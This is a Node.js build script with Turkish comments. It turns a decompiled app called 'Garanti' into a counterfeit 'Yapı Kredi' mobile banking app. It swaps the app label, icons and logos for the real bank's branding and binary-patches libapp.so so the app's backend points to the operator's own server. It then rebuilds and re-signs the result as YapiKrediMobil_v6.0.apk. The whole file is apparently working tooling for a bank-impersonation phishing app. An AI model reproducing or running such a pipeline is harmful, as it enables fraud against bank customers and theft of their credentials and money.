const fs = require('fs');
const path = require('path');
const cp = require('child_process');

console.log("=== GARANTİ → YAPI KREDİ DÖNÜŞÜM MOTORU ===\n");

const BASE = 'garanti_decompiled';
const OUT_APK = 'C:\\Users\\PC\\Desktop\\YapiKrediMobil_v6.0.apk';
const ICON_FILE = 'icon.png';
const JAVA = '"C:\\Program Files\\Eclipse Adoptium\\jre-25.0.2.10-hotspot\\bin\\java.exe"';

// ─────────────────────────────────────────
// ADIM 1: AndroidManifest — app label değiştir
// ─────────────────────────────────────────
console.log("[1/6] AndroidManifest.xml düzenleniyor...");
const manifestPath = path.join(BASE, 'AndroidManifest.xml');
let manifest = fs.readFileSync(manifestPath, 'utf8');
// label="Garanti" → label="Yapı Kredi"
manifest = manifest.replace(/android:label="[^"]*"/g, 'android:label="Yapı Kredi"');
fs.writeFileSync(manifestPath, manifest, 'utf8');
console.log("  ✔ App label → 'Yapı Kredi'");

// ─────────────────────────────────────────
// ADIM 2: apktool.yml — package name güncelle (opsiyonel — aynı bırakıyoruz çünkü install edilmiş)
// ─────────────────────────────────────────
// Package name aynı kalacak (com.example.garanti) — sadece görsel değişim istendi

// ─────────────────────────────────────────
// ADIM 3: İkonları YKB logosuyla değiştir
// ─────────────────────────────────────────
console.log("[2/6] İkonlar Yapı Kredi logosuyla değiştiriliyor...");
const iconData = fs.readFileSync(ICON_FILE);
const mipmapDirs = fs.readdirSync(path.join(BASE, 'res')).filter(d => d.startsWith('mipmap-'));
let iconCount = 0;
mipmapDirs.forEach(dir => {
    const fullDir = path.join(BASE, 'res', dir);
    fs.readdirSync(fullDir).forEach(file => {
        if (file.includes('ic_launcher')) {
            fs.writeFileSync(path.join(fullDir, file), iconData);
            iconCount++;
        }
    });
});
console.log(`  ✔ ${iconCount} ikon dosyası değiştirildi`);

// ─────────────────────────────────────────
// ADIM 4: libapp.so — Backend URL binary patch
// ─────────────────────────────────────────
console.log("[3/6] libapp.so — Backend URL patching...");

const OUR_URL = 'http://192.168.1.153:8000/api';

// Her mimari için patch uygula
['arm64-v8a', 'armeabi-v7a', 'x86_64'].forEach(arch => {
    const soPath = path.join(BASE, 'lib', arch, 'libapp.so');
    if (!fs.existsSync(soPath)) return;

    let buf = fs.readFileSync(soPath);
    
    // PythonAnywhere URL'ini bul ve değiştir
    const garanti_url = 'https://2121kralbenim.pythonanywhere.com/api';
    const garanti_bytes = Buffer.from(garanti_url, 'utf8');
    const our_bytes = Buffer.from(OUR_URL, 'utf8');
    
    let found = false;
    for (let i = 0; i <= buf.length - garanti_bytes.length; i++) {
        let match = true;
        for (let j = 0; j < garanti_bytes.length; j++) {
            if (buf[i + j] !== garanti_bytes[j]) { match = false; break; }
        }
        if (match) {
            // Yerleştir: kısa URL + null byte'larla doldur
            for (let j = 0; j < garanti_bytes.length; j++) {
                buf[i + j] = j < our_bytes.length ? our_bytes[j] : 0x00;
            }
            found = true;
            console.log(`  ✔ [${arch}] PythonAnywhere URL → bizim sunucu (offset: 0x${i.toString(16)})`);
            break;
        }
    }
    
    if (!found) {
        console.log(`  ⚠ [${arch}] PythonAnywhere URL bulunamadı — localhost URL aranıyor...`);
        // localhost:8000 URL'i de dene
        const local_url = 'http://localhost:8000/api';
        const local_bytes = Buffer.from(local_url, 'utf8');
        for (let i = 0; i <= buf.length - local_bytes.length; i++) {
            let match = true;
            for (let j = 0; j < local_bytes.length; j++) {
                if (buf[i + j] !== local_bytes[j]) { match = false; break; }
            }
            if (match) {
                // Değiştir (uzunluk eşit veya kısa olduğundan null doldur)
                for (let j = 0; j < local_bytes.length; j++) {
                    buf[i + j] = j < our_bytes.length ? our_bytes[j] : 0x00;
                }
                console.log(`  ✔ [${arch}] localhost URL → bizim sunucu`);
                found = true;
                break;
            }
        }
    }
    
    if (!found) {
        console.log(`  ❌ [${arch}] Hiçbir URL bulunamadı`);
    }
    
    fs.writeFileSync(soPath, buf);
});

// ─────────────────────────────────────────
// ADIM 5: Garanti logosu asset'lerini YKB ile değiştir
// ─────────────────────────────────────────
console.log("[4/6] Garanti logo asset'leri YKB logosuyla değiştiriliyor...");
const ekranresimDir = path.join(BASE, 'assets', 'flutter_assets', 'ekranresim');
if (fs.existsSync(ekranresimDir)) {
    // beyazlogo.png → YKB logo (PNG format olarak direkt koyuyoruz)
    const logoFiles = ['beyazlogo.png'];
    logoFiles.forEach(f => {
        const target = path.join(ekranresimDir, f);
        if (fs.existsSync(target)) {
            fs.writeFileSync(target, iconData); // YKB ikonuyla değiştir
            console.log(`  ✔ ${f} → YKB logo`);
        }
    });
}

// ─────────────────────────────────────────
// ADIM 6: APK Rebuild
// ─────────────────────────────────────────
console.log("\n[5/6] apktool ile APK derleniyor... (Bu biraz sürer)");
if (fs.existsSync(OUT_APK)) fs.unlinkSync(OUT_APK);

try {
    const buildOut = cp.execSync(
        `${JAVA} -jar apktool.jar b "${BASE}" -o "${OUT_APK}" --use-aapt2`,
        { encoding: 'utf8', timeout: 120000 }
    );
    console.log(buildOut);
} catch(e) {
    console.log("aapt2 deneniyor normal modda...");
    try {
        const buildOut = cp.execSync(
            `${JAVA} -jar apktool.jar b "${BASE}" -o "${OUT_APK}"`,
            { encoding: 'utf8', timeout: 120000 }
        );
        console.log(buildOut);
    } catch(e2) {
        console.error("APK derleme hatası:", e2.message);
        process.exit(1);
    }
}

// ─────────────────────────────────────────
// ADIM 7: İmzalama
// ─────────────────────────────────────────
console.log("[6/6] APK imzalanıyor...");
try {
    const signOut = cp.execSync(
        `${JAVA} -jar uber-apk-signer.jar -a "${OUT_APK}" --allowResign --overwrite`,
        { encoding: 'utf8', timeout: 60000 }
    );
    console.log(signOut);
} catch(e) {
    console.log("uber-signer deneniyor...", e.message.substring(0,200));
}

if (fs.existsSync(OUT_APK)) {
    const stat = fs.statSync(OUT_APK);
    console.log('\n╔══════════════════════════════════════════════════╗');
    console.log('║  ✅  BAŞARILI! APK MASAÜSTÜNDE HAZIR             ║');
    console.log('╠══════════════════════════════════════════════════╣');
    console.log(`║  📁  YapiKrediMobil_v6.0.apk                    ║`);
    console.log(`║  📦  Boyut: ${Math.round(stat.size/1024/1024*100)/100} MB                          ║`);
    console.log('║  🎯  Garanti → Yapı Kredi dönüşümü tamamlandı   ║');
    console.log('╚══════════════════════════════════════════════════╝');
} else {
    console.log("❌ APK oluşturulamadı, log'u kontrol et.");
}
